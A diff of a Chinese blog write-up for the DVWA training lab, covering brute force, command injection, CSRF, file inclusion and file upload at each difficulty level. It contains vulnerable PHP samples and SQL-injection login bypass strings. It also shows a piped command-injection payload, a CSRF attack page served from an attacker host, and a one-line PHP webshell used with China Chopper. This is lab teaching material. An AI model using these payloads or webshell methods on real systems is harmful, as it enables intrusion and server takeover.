@@ -99,191 +99,55 @@
 <h1 id="第一题-Brute-Force"><a href="#第一题-Brute-Force" class="headerlink" title="第一题-Brute-Force"></a>第一题-Brute-Force</h1><p><img src="https://image.3001.net/images/20161009/14760002264830.jpg!small"></p>
 <h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>查看源代码</p>
 <p>   <code>&lt;?php</code></p>
-<pre><code>if(isset($_GET[&#39;Login&#39;]))&#123;
-//Getusername
-$user=$_GET[&#39;username&#39;];
-
-//Getpassword
-$pass=$_GET[&#39;password&#39;];
-$pass=md5($pass);
-
-//Checkthedatabase
-$query=&quot;SELECT*FROM`users`WHEREuser=&#39;$user&#39;ANDpassword=&#39;$pass&#39;;&quot;;
-$result=mysql_query($query)ordie(&#39;&lt;pre&gt;&#39;.mysql_error().&#39;&lt;/pre&gt;&#39;);
-
-if($result&amp;&amp;mysql_num_rows($result)==1)&#123;
-//Getusersdetails
-$avatar=mysql_result($result,0,&quot;avatar&quot;);
-
-//Loginsuccessful
-echo&quot;&lt;p&gt;Welcometothepasswordprotectedarea&#123;$user&#125;&lt;/p&gt;&quot;;
-echo&quot;&lt;imgsrc=&quot;&#123;$avatar&#125;&quot;/&gt;&quot;;
-&#125;
-else&#123;
-//Loginfailed
-echo&quot;&lt;pre&gt;&lt;br/&gt;Usernameand/orpasswordincorrect.&lt;/pre&gt;&quot;;
-&#125;
-
-mysql_close();
-&#125;
-
-?&gt;&#39;</code></pre>
+<p>   <code> if(isset($_GET[&#39;Login&#39;]))&#123;</code><br>   <code> //Getusername</code><br>    <code>$user=$_GET[&#39;username&#39;];</code><br>    <code>//Getpassword</code><br>    <code>$pass=$_GET[&#39;password&#39;];</code><br>    <code>$pass=md5($pass);</code><br>    <code>//Checkthedatabase</code><br>    <code>$query=&quot;SELECT*FROM</code>users<code>WHEREuser=&#39;$user&#39;ANDpassword=&#39;$pass&#39;;&quot;;</code><br>    <code>$result=mysql_query($query)ordie(&#39;&lt;pre&gt;&#39;.mysql_error().&#39;&lt;/pre&gt;&#39;);</code><br>    if($result&amp;&amp;mysql_num_rows($result)==1){<br>    //Getusersdetails<br>    $avatar=mysql_result($result,0,”avatar”);<br>    //Loginsuccessful<br>    <code>echo&quot;&lt;p&gt;Welcometothepasswordprotectedarea&#123;$user&#125;&lt;/p&gt;&quot;;</code><br>    <code>echo&quot;&lt;imgsrc=&quot;&#123;$avatar&#125;&quot;/&gt;&quot;;</code><br>    }<br>    else{<br>    //Loginfailed<br>    <code>echo&quot;&lt;pre&gt;&lt;br/&gt;Usernameand/orpasswordincorrect.&lt;/pre&gt;&quot;;</code><br>    }<br>    mysql_close();<br>    }<br>    ?&gt;</p>
 <p>可以看到，服务器只是验证了参数Login是否被设置（isset函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false），没有任何的防爆破机制，且对参数username、password没有做任何过滤，存在明显的sql注入漏洞。<br>（1）burpsuit<br>    第一步抓包<br><img src="https://image.3001.net/images/20161009/14760003309956.png!small"><br>    第二步，ctrl+I将包复制到intruder模块，因为要对password参数进行爆破，所以在password参数的内容两边加$<br><img src="https://image.3001.net/images/20161009/147600029633.png!small"><br>    第三步选中Payloads，载入字典，点击Start attack进行爆破<br><img src="https://image.3001.net/images/20161009/14760003769188.png!small"><br>最后，尝试在爆破结果中找到正确的密码，可以看到password的响应包长度（length）“与众不同”，可推测password为正确密码，手工验证登陆成功。<br><img src="https://image.3001.net/images/20161009/14760004176934.png!small"><br>(2)sql注入<br>万能密钥<br>admin’or ‘1’=’1<br>admin’ – -<br>admin’ # </p>
 <p>注入成功<br><img src="https://image.3001.net/images/20161009/14760004593118.png!small"></p>
 <h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>源代码</p>
 <hr>
-<p>`&lt;?php</p>
-<p>if(isset($_GET[‘Login’])){<br>//Sanitiseusernameinput<br>$user=$_GET[‘username’];<br>$user=mysql_real_escape_string($user);</p>
-<p>//Sanitisepasswordinput<br>$pass=$_GET[‘password’];<br>$pass=mysql_real_escape_string($pass);<br>$pass=md5($pass);</p>
-<p>//Checkthedatabase<br>$query=”SELECT*FROM<code>users</code>WHEREuser=’$user’ANDpassword=’$pass’;”;<br>$result=mysql_query($query)ordie(‘<pre>'.mysql_error().'</pre>‘);</p>
-<p>if($result&amp;&amp;mysql_num_rows($result)==1){<br>//Getusersdetails<br>$avatar=mysql_result($result,0,”avatar”);</p>
-<p>//Loginsuccessful<br>echo”<p>Welcometothepasswordprotectedarea{$user}</p>“;<br>echo”&lt;imgsrc=”{$avatar}”/&gt;”;<br>}<br>else{<br>//Loginfailed<br>sleep(2);<br>echo”<pre><br/>Usernameand/orpasswordincorrect.</pre>“;<br>}</p>
-<p>mysql_close();<br>}</p>
-<p>?&gt;</p>
+<p><code>&lt;?php</code><br>if(isset($_GET[‘Login’])){<br>//Sanitiseusernameinput<br>$user=$_GET[‘username’];<br>$user=mysql_real_escape_string($user);<br>//Sanitisepasswordinput<br>$pass=$_GET[‘password’];<br>$pass=mysql_real_escape_string($pass);<br>$pass=md5($pass);<br>//Checkthedatabase<br>$query=”SELECT*FROM<code>users</code>WHEREuser=’$user’ANDpassword=’$pass’;”;<br><code>$result=mysql_query($query)ordie(&#39;&lt;pre&gt;&#39;.mysql_error().&#39;&lt;/pre&gt;&#39;);</code><br>if($result&amp;&amp;mysql_num_rows($result)==1){<br>//Getusersdetails<br>$avatar=mysql_result($result,0,”avatar”);<br>//Loginsuccessful<br><code>echo&quot;&lt;p&gt;Welcometothepasswordprotectedarea&#123;$user&#125;&lt;/p&gt;&quot;;</code><br><code>echo&quot;&lt;imgsrc=&quot;&#123;$avatar&#125;&quot;/&gt;&quot;;</code><br>}<br>else{<br>//Loginfailed<br>sleep(2);<br><code>echo&quot;&lt;pre&gt;&lt;br/&gt;Usernameand/orpasswordincorrect.&lt;/pre&gt;&quot;;</code><br>}<br>mysql_close();<br>}<br>?&gt;</p>
 <hr>
 <p>sql注入失效，但burtsuit仍然可用</p>
 <h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>源代码</p>
 <hr>
 <?php
-
 if( isset( $_GET[ 'Login' ] ) ) {
     // Check Anti-CSRF token
     checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
-
     // Sanitise username input
     $user = $_GET[ 'username' ];
     $user = stripslashes( $user );
     $user = mysql_real_escape_string( $user );
-
     // Sanitise password input
     $pass = $_GET[ 'password' ];
     $pass = stripslashes( $pass );
     $pass = mysql_real_escape_string( $pass );
     $pass = md5( $pass );
-
     // Check database
     $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
-    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );
-
+    `$result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );`
     if( $result && mysql_num_rows( $result ) == 1 ) {
         // Get users details
         $avatar = mysql_result( $result, 0, "avatar" );
-
         // Login successful
-        echo "<p>Welcome to the password protected area {$user}</p>";
-        echo "<img src=\"{$avatar}\" />";
+       ` echo "<p>Welcome to the password protected area {$user}</p>";`
+       ` echo "<img src=\"{$avatar}\" />";`
     }
     else {
         // Login failed
         sleep( rand( 0, 3 ) );
-        echo "<pre><br />Username and/or password incorrect.</pre>";
+        `echo "<pre><br />Username and/or password incorrect.</pre>";`
     }
-
     mysql_close();
 }
-
 // Generate Anti-CSRF token
 generateSessionToken();
 
 ?><h2 id=""><a href="#" class="headerlink" title=" "></a> </h2><p>可以发现，每次发送的时候，都带上了一个 user_token，每次发送请求的时候 user_token 都是会变的，而 user_token 是来自于上一个数据包的。<br><img src="https://img2018.cnblogs.com/blog/1124357/201908/1124357-20190801155938323-247510334.jpg"><br>使用burpsuit爆破</p>
 <p>依次选择【Project options】-&gt;【Sessions】-&gt;【add】-&gt; 【add a Rule Description】-&gt; 【Run a macro(宏)】</p>
 <p>选择新建宏<br><img src="https://img2018.cnblogs.com/blog/1124357/201908/1124357-20190801155937317-848154105.jpg"><br>添加的时候，选择配置<br><img src="https://img2018.cnblogs.com/blog/1124357/201908/1124357-20190801155939617-165513722.jpg"><br><img src="https://img2018.cnblogs.com/blog/1124357/201908/1124357-20190801155938529-1012197189.jpg"></p>
-<h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><?php
-
-if( isset( $_POST[ 'Login' ] ) ) {
-    // Check Anti-CSRF token
-    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
-
-    // Sanitise username input
-    $user = $_POST[ 'username' ];
-    $user = stripslashes( $user );
-    $user = mysql_real_escape_string( $user );
-
-    // Sanitise password input
-    $pass = $_POST[ 'password' ];
-    $pass = stripslashes( $pass );
-    $pass = mysql_real_escape_string( $pass );
-    $pass = md5( $pass );
-
-    // Default values
-    $total_failed_login = 3;
-    $lockout_time       = 15;
-    $account_locked     = false;
-
-    // Check the database (Check user information)
-    $data = $db->prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' );
-    $data->bindParam( ':user', $user, PDO::PARAM_STR );
-    $data->execute();
-    $row = $data->fetch();
-
-    // Check to see if the user has been locked out.
-    if( ( $data->rowCount() == 1 ) && ( $row[ 'failed_login' ] >= $total_failed_login ) )  {
-        // User locked out.  Note, using this method would allow for user enumeration!
-        //echo "<pre><br />This account has been locked due to too many incorrect logins.</pre>";
-
-        // Calculate when the user would be allowed to login again
-        $last_login = $row[ 'last_login' ];
-        $last_login = strtotime( $last_login );
-        $timeout    = strtotime( "{$last_login} +{$lockout_time} minutes" );
-        $timenow    = strtotime( "now" );
-
-        // Check to see if enough time has passed, if it hasn't locked the account
-        if( $timenow > $timeout )
-            $account_locked = true;
-    }
-
-    // Check the database (if username matches the password)
-    $data = $db->prepare( 'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
-    $data->bindParam( ':user', $user, PDO::PARAM_STR);
-    $data->bindParam( ':password', $pass, PDO::PARAM_STR );
-    $data->execute();
-    $row = $data->fetch();
-
-    // If its a valid login...
-    if( ( $data->rowCount() == 1 ) && ( $account_locked == false ) ) {
-        // Get users details
-        $avatar       = $row[ 'avatar' ];
-        $failed_login = $row[ 'failed_login' ];
-        $last_login   = $row[ 'last_login' ];
-
-        // Login successful
-        echo "<p>Welcome to the password protected area <em>{$user}</em></p>";
-        echo "<img src=\"{$avatar}\" />";
-
-        // Had the account been locked out since last login?
-        if( $failed_login >= $total_failed_login ) {
-            echo "<p><em>Warning</em>: Someone might of been brute forcing your account.</p>";
-            echo "<p>Number of login attempts: <em>{$failed_login}</em>.<br />Last login attempt was at: <em>${last_login}</em>.</p>";
-        }
-
-        // Reset bad login count
-        $data = $db->prepare( 'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;' );
-        $data->bindParam( ':user', $user, PDO::PARAM_STR );
-        $data->execute();
-    }
-    else {
-        // Login failed
-        sleep( rand( 2, 4 ) );
-
-        // Give the user some feedback
-        echo "<pre><br />Username and/or password incorrect.<br /><br/>Alternative, the account has been locked because of too many failed logins.<br />If this is the case, <em>please try again in {$lockout_time} minutes</em>.</pre>";
-
-        // Update bad login count
-        $data = $db->prepare( 'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;' );
-        $data->bindParam( ':user', $user, PDO::PARAM_STR );
-        $data->execute();
-    }
-
-    // Set the last login time
-    $data = $db->prepare( 'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;' );
-    $data->bindParam( ':user', $user, PDO::PARAM_STR );
-    $data->execute();
-}
-
-// Generate Anti-CSRF token
-generateSessionToken();
-
-?><h2 id="-1"><a href="#-1" class="headerlink" title=" "></a> </h2><p>错误三次后会锁定15分钟以上</p>
+<h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p><code>&lt;?php</code><br>if( isset( $_POST[ ‘Login’ ] ) ) {<br>    // Check Anti-CSRF token<br>    checkToken( $_REQUEST[ ‘user_token’ ], $_SESSION[ ‘session_token’ ], ‘index.php’ );<br>    // Sanitise username input<br>    $user = $_POST[ ‘username’ ];<br>    $user = stripslashes( $user );<br>    $user = mysql_real_escape_string( $user );<br>    // Sanitise password input<br>    $pass = $_POST[ ‘password’ ];<br>    $pass = stripslashes( $pass );<br>    $pass = mysql_real_escape_string( $pass );<br>    $pass = md5( $pass );<br>    // Default values<br>    $total_failed_login = 3;<br>    $lockout_time       = 15;<br>    $account_locked     = false;<br>    // Check the database (Check user information)<br>    $data = $db-&gt;prepare( ‘SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;’ );<br>    $data-&gt;bindParam( ‘:user’, $user, PDO::PARAM_STR );<br>    $data-&gt;execute();<br>    $row = $data-&gt;fetch();<br>    // Check to see if the user has been locked out.<br>    if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ ‘failed_login’ ] &gt;= $total_failed_login ) )  {<br>        // User locked out.  Note, using this method would allow for user enumeration!<br>        <code>//echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;</code><br>        // Calculate when the user would be allowed to login again<br>        $last_login = $row[ ‘last_login’ ];<br>        $last_login = strtotime( $last_login );<br>        $timeout    = strtotime( “{$last_login} +{$lockout_time} minutes” );<br>        $timenow    = strtotime( “now” );<br>        // Check to see if enough time has passed, if it hasn’t locked the account<br>        if( $timenow &gt; $timeout )<br>            $account_locked = true;<br>    }<br>    // Check the database (if username matches the password)<br>    $data = $db-&gt;prepare( ‘SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;’ );<br>    $data-&gt;bindParam( ‘:user’, $user, PDO::PARAM_STR);<br>    $data-&gt;bindParam( ‘:password’, $pass, PDO::PARAM_STR );<br>    $data-&gt;execute();<br>    $row = $data-&gt;fetch();<br>    // If its a valid login…<br>    if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) {<br>        // Get users details<br>        $avatar       = $row[ ‘avatar’ ];<br>        $failed_login = $row[ ‘failed_login’ ];<br>        $last_login   = $row[ ‘last_login’ ];<br>        // Login successful<br>       <code> echo &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;&#123;$user&#125;&lt;/em&gt;&lt;/p&gt;&quot;;</code><br>        <code>echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;</code><br>        // Had the account been locked out since last login?<br>        if( $failed_login &gt;= $total_failed_login ) {<br>           <code> echo &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;;</code><br>           <code> echo &quot;&lt;p&gt;Number of login attempts: &lt;em&gt;&#123;$failed_login&#125;&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;;</code><br>        }<br>        // Reset bad login count<br>        $data = $db-&gt;prepare( ‘UPDATE users SET failed_login = “0” WHERE user = (:user) LIMIT 1;’ );<br>        $data-&gt;bindParam( ‘:user’, $user, PDO::PARAM_STR );<br>        $data-&gt;execute();<br>    }<br>    else {<br>        // Login failed<br>        sleep( rand( 2, 4 ) );<br>        // Give the user some feedback<br>      <code>  echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in &#123;$lockout_time&#125; minutes&lt;/em&gt;.&lt;/pre&gt;&quot;;</code><br>        // Update bad login count<br>        $data = $db-&gt;prepare( ‘UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;’ );<br>        $data-&gt;bindParam( ‘:user’, $user, PDO::PARAM_STR );<br>        $data-&gt;execute();<br>    }<br>    // Set the last login time<br>    $data = $db-&gt;prepare( ‘UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;’ );<br>    $data-&gt;bindParam( ‘:user’, $user, PDO::PARAM_STR );<br>    $data-&gt;execute();<br>}<br>// Generate Anti-CSRF token<br>generateSessionToken();<br>?&gt; </p>
+<hr>
+<p>错误三次后会锁定15分钟以上</p>
 <p>burp爆破关键词<br><img src="https://img2018.cnblogs.com/blog/1124357/201908/1124357-20190801155938064-1430455794.jpg"><br><img src="https://img2018.cnblogs.com/blog/1124357/201908/1124357-20190801155938250-1479654924.jpg"></p>
 <h1 id="第二题-Command-Injection"><a href="#第二题-Command-Injection" class="headerlink" title="第二题-Command-Injection"></a>第二题-Command-Injection</h1><p><img src="https://image.3001.net/images/20161016/14765776616648.png!small"></p>
 <h2 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h2><p>源代码</p>
@@ -291,33 +155,19 @@ generateSessionToken();
 <?php 
 
 if( isset( $_POST[ 'Submit' ]  ) ) { 
-
     // Get input 
-
     $target = $_REQUEST[ 'ip' ]; 
-
     // Determine OS and execute the ping command. 
-
     if( stristr( php_uname( 's' ), 'Windows NT' ) ) { 
-
         // Windows 
-
         $cmd = shell_exec( 'ping  ' . $target ); 
-
     } 
-
     else { 
-
         // *nix 
-
         $cmd = shell_exec( 'ping  -c 4 ' . $target ); 
-
     } 
-
     // Feedback for the end user 
-
-    echo "<pre>{$cmd}</pre>"; 
-
+    `echo "<pre>{$cmd}</pre>"; `
 } 
 
 ?><p> </p>
@@ -445,7 +295,7 @@ if( isset( $_POST[ 'Submit' ]  ) ) {
 
 } 
 
-?><h2 id="-2"><a href="#-2" class="headerlink" title=" "></a> </h2><p>漏洞利用</p>
+?><h2 id="-1"><a href="#-1" class="headerlink" title=" "></a> </h2><p>漏洞利用</p>
 <p>黑名单看似过滤了所有的非法字符，但仔细观察到是把”| ”（注意这里|后有一个空格）替换为空字符，于是 ”|”成了“漏网之鱼”。</p>
 <p>127.0.0.1|net user<br><img src="https://img-blog.csdnimg.cn/20190615092435426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FpXzY0,size_16,color_FFFFFF,t_70"></p>
 <h2 id="impossible-1"><a href="#impossible-1" class="headerlink" title="impossible"></a>impossible</h2><h2 id="源代码-2"><a href="#源代码-2" class="headerlink" title="源代码"></a>源代码</h2><?php 
@@ -512,7 +362,7 @@ if( isset( $_POST[ 'Submit' ]  ) ) {
 
 generateSessionToken(); 
 
-?><h2 id="-3"><a href="#-3" class="headerlink" title=" "></a> </h2><h2 id="impossible等级，对命令注入行为正确防护。"><a href="#impossible等级，对命令注入行为正确防护。" class="headerlink" title="impossible等级，对命令注入行为正确防护。"></a>impossible等级，对命令注入行为正确防护。</h2><p>基础知识补充</p>
+?><h2 id="-2"><a href="#-2" class="headerlink" title=" "></a> </h2><h2 id="impossible等级，对命令注入行为正确防护。"><a href="#impossible等级，对命令注入行为正确防护。" class="headerlink" title="impossible等级，对命令注入行为正确防护。"></a>impossible等级，对命令注入行为正确防护。</h2><p>基础知识补充</p>
 <p>命令区别（&amp;、|、&amp;&amp;、||）</p>
 <p>&amp;起到连接命令的作用，不管前一条命令是否执行成功，下一条都会接着执行。</p>
 <p>|起到管道的作用，前一条命令的输出，作为下一条命令的输入，只打印最后一条命令的执行结果。</p>
@@ -586,7 +436,7 @@ if( isset( $_GET[ 'Change' ] ) ) {
     mysql_close(); 
 } 
 
-?><h2 id="-4"><a href="#-4" class="headerlink" title=" "></a> </h2><p>可以看到，Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是192.168.153.130），希望通过这种机制抵御CSRF攻击。</p>
+?><h2 id="-3"><a href="#-3" class="headerlink" title=" "></a> </h2><p>可以看到，Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是192.168.153.130），希望通过这种机制抵御CSRF攻击。</p>
 <p>过滤规则是http包头的Referer参数的值中必须包含主机名（这里是192.168.153.130）</p>
 <p>我们可以将攻击页面命名为192.168.153.130.html（页面被放置在攻击者的服务器里，这里是10.4.253.2）就可以绕过了</p>
 <p>下面是Burpsuite的截图<br><img src="https://image.3001.net/images/20161031/1477895636890.png!small"></p>
@@ -628,7 +478,7 @@ if( isset( $_GET[ 'Change' ] ) ) {
 // Generate Anti-CSRF token 
 generateSessionToken(); 
 
-?><h2 id="-5"><a href="#-5" class="headerlink" title=" "></a> </h2><p>可以看到，High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p>
+?><h2 id="-4"><a href="#-4" class="headerlink" title=" "></a> </h2><p>可以看到，High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p>
 <h2 id="构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成CSRF攻击，下面是代码。"><a href="#构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成CSRF攻击，下面是代码。" class="headerlink" title="构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成CSRF攻击，下面是代码。"></a>构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成CSRF攻击，下面是代码。</h2><script type="text/javascript">
 
     function attack()
@@ -715,12 +565,12 @@ if( isset( $_GET[ 'Change' ] ) ) {
 // Generate Anti-CSRF token 
 generateSessionToken(); 
 
-?><h2 id="-6"><a href="#-6" class="headerlink" title=" "></a> </h2><p>可以看到，Impossible级别的代码要求用户输入原始密码，攻击者在不知道原始密码的情况下，无法进行CSRF攻击。</p>
+?><h2 id="-5"><a href="#-5" class="headerlink" title=" "></a> </h2><p>可以看到，Impossible级别的代码要求用户输入原始密码，攻击者在不知道原始密码的情况下，无法进行CSRF攻击。</p>
 <h1 id="第四题File-Inclusion"><a href="#第四题File-Inclusion" class="headerlink" title="第四题File-Inclusion"></a>第四题File-Inclusion</h1><p><img src="https://image.3001.net/images/20161106/14784220172185.png!small"></p>
 <h2 id="low-3"><a href="#low-3" class="headerlink" title="low"></a>low</h2><h2 id="源代码-5"><a href="#源代码-5" class="headerlink" title="源代码"></a>源代码</h2><?php 
 // The page we wish to display 
 $file = $_GET[ 'page' ]; 
-?><h2 id="-7"><a href="#-7" class="headerlink" title=" "></a> </h2><p>我们先点击file1.php效果如下：<br><img src="https://pics4.baidu.com/feed/48540923dd54564e458a3432b8164084d0584f19.png?token=8e0df337e643d14699f8db6f835c1bef"><br>在burp中对其抓包<br><img src="https://pics4.baidu.com/feed/91529822720e0cf3165ae065028e2e19bc09aaca.png?token=d4a6d4ad5105c98fa81a5e9f0778d4cb"><br>读取任意文件测试，我们在D盘新建一个txt构造下面命令：读取d盘下的bbskali.txt文件<br><img src="https://pics2.baidu.com/feed/838ba61ea8d3fd1f21b1fa183a86f91994ca5fa2.png?token=a1414ce9fd591db547742e5071095679"><br>访问远程文件<br><img src="https://pics3.baidu.com/feed/d1a20cf431adcbefca128176bd67f2dba2cc9fef.png?token=d74cdf0e394b5f46d043286cb3c4e6f3"></p>
+?><h2 id="-6"><a href="#-6" class="headerlink" title=" "></a> </h2><p>我们先点击file1.php效果如下：<br><img src="https://pics4.baidu.com/feed/48540923dd54564e458a3432b8164084d0584f19.png?token=8e0df337e643d14699f8db6f835c1bef"><br>在burp中对其抓包<br><img src="https://pics4.baidu.com/feed/91529822720e0cf3165ae065028e2e19bc09aaca.png?token=d4a6d4ad5105c98fa81a5e9f0778d4cb"><br>读取任意文件测试，我们在D盘新建一个txt构造下面命令：读取d盘下的bbskali.txt文件<br><img src="https://pics2.baidu.com/feed/838ba61ea8d3fd1f21b1fa183a86f91994ca5fa2.png?token=a1414ce9fd591db547742e5071095679"><br>访问远程文件<br><img src="https://pics3.baidu.com/feed/d1a20cf431adcbefca128176bd67f2dba2cc9fef.png?token=d74cdf0e394b5f46d043286cb3c4e6f3"></p>
 <h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><hr>
 <p>&lt;php</p>
 <p>//Thepagewewishtodisplay<br>$file=$_GET[‘page’];</p>
@@ -740,7 +590,7 @@ if( !fnmatch( "file*", $file ) && $file != "include.php" ) { 
     echo "ERROR: File not found!"; 
     exit; 
 } 
-?><h2 id="-8"><a href="#-8" class="headerlink" title="  "></a>  </h2><p>High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。</p>
+?><h2 id="-7"><a href="#-7" class="headerlink" title="  "></a>  </h2><p>High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。</p>
 <p>本地文件包含<br><img src="https://img-blog.csdnimg.cn/20190616173806526.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FpXzY0,size_16,color_FFFFFF,t_70"></p>
 <h2 id="impossible-3"><a href="#impossible-3" class="headerlink" title="impossible"></a>impossible</h2><hr>
 <?php 
@@ -752,7 +602,7 @@ if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $f
     echo "ERROR: File not found!"; 
     exit; 
 } 
-?><h2 id="-9"><a href="#-9" class="headerlink" title=" "></a> </h2><p>Impossible级别的代码彻底杜绝了文件包含漏洞</p>
+?><h2 id="-8"><a href="#-8" class="headerlink" title=" "></a> </h2><p>Impossible级别的代码彻底杜绝了文件包含漏洞</p>
 <h1 id="第五题-File-Upload"><a href="#第五题-File-Upload" class="headerlink" title="第五题-File-Upload"></a>第五题-File-Upload</h1><p><img src="https://image.3001.net/images/20161108/14785910509354.png!small"></p>
 <h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><h2 id="源代码-6"><a href="#源代码-6" class="headerlink" title="源代码"></a>源代码</h2><?php 
 
@@ -772,7 +622,7 @@ if( isset( $_POST[ 'Upload' ] ) ) {
     } 
 } 
 
-?><h2 id="-10"><a href="#-10" class="headerlink" title=" "></a> </h2><p>上传文件一句话木马<br><img src="https://image.3001.net/images/20161108/14785912161713.png!small"><br>上传成功，并且返回了上传路径<br><img src="https://image.3001.net/images/20161108/1478591243183.png!small"><br>打开中国菜刀，右键添加，</p>
+?><h2 id="-9"><a href="#-9" class="headerlink" title=" "></a> </h2><p>上传文件一句话木马<br><img src="https://image.3001.net/images/20161108/14785912161713.png!small"><br>上传成功，并且返回了上传路径<br><img src="https://image.3001.net/images/20161108/1478591243183.png!small"><br>打开中国菜刀，右键添加，</p>
 <p>地址栏填入上传文件所在路径<a target="_blank" rel="noopener" href="http://192.168.153.130/dvwa/hackable/uploads/hack.php%EF%BC%8C">http://192.168.153.130/dvwa/hackable/uploads/hack.php，</a></p>
 <p>参数名（一句话木马口令）为apple。</p>
 <p><img src="https://image.3001.net/images/20161108/14785912718652.png!small"><br>然后菜刀就会通过向服务器发送包含apple参数的post请求，在服务器上执行任意命令，获取webshell权限。</p>
@@ -810,7 +660,7 @@ if( isset( $_POST[ 'Upload' ] ) ) {
     } 
 } 
 
-?><h2 id="-11"><a href="#-11" class="headerlink" title=" "></a> </h2><p>Medium级别的代码对上传文件的类型、大小做了限制，要求文件类型必须是jpeg或者png，大小不能超过100000B。</p>
+?><h2 id="-10"><a href="#-10" class="headerlink" title=" "></a> </h2><p>Medium级别的代码对上传文件的类型、大小做了限制，要求文件类型必须是jpeg或者png，大小不能超过100000B。</p>
 <p>因为采用的是一句话木马，所以文件大小不会有问题，至于文件类型的检查，尝试修改文件名为hack.png。<br><img src="https://image.3001.net/images/20161108/14785914897497.png!small"><br>抓包。<br><img src="https://image.3001.net/images/20161108/1478591669326![]()!small"><br>可以看到文件类型为image/png，尝试修改filename为hack.php。<br><img src="https://image.3001.net/images/20161108/14785917089423.png!small"><br>上传成功。<br><img src="https://image.3001.net/images/20161108/14785917335700.png!small"><br>上菜刀，获取webshell权限。<br><img src="https://image.3001.net/images/20161108/14785917654899.png!small"></p>
 <h2 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h2><h2 id="源代码-7"><a href="#源代码-7" class="headerlink" title="源代码"></a>源代码</h2><?php 
 
@@ -846,7 +696,7 @@ if( isset( $_POST[ 'Upload' ] ) ) {
     } 
 } 
 
-?><h2 id="-12"><a href="#-12" class="headerlink" title=" "></a> </h2><p>High级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是”*.jpg”、”*.jpeg” 、”*.png”之一。同时，getimagesize函数更是限制了上传文件的文件头必须为图像类型。</p>
+?><h2 id="-11"><a href="#-11" class="headerlink" title=" "></a> </h2><p>High级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是”*.jpg”、”*.jpeg” 、”*.png”之一。同时，getimagesize函数更是限制了上传文件的文件头必须为图像类型。</p>
 <p>首先利用copy将一句话木马文件1.php与图片文件1.jpg合并生成hack.jpg，打开可以看到，一句话木马藏到了最后。<br><img src="https://image.3001.net/images/20161108/14785919855138.png!small"><br>顺利通过文件头检查，可以成功上传。<br><img src="https://image.3001.net/images/20161108/14785920131063.png!small"><br>上菜刀，右键添加shell，成功拿到webshell。<br><img src="https://image.3001.net/images/20161108/14785921471182.png!small"></p>
